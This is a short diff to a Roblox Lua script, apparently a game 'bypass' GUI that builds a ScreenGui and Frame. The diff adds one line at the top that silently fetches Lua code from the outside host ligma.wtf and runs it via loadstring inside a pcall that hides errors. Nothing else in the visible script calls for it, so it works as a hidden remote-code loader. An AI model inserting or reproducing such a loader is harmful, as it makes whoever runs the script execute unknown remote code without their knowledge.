@@ -1,5 +1,5 @@
 -- // ~ ui and bypasses by spec ~ //
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 -- // ~ makes elements
 local specskeyboardr = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
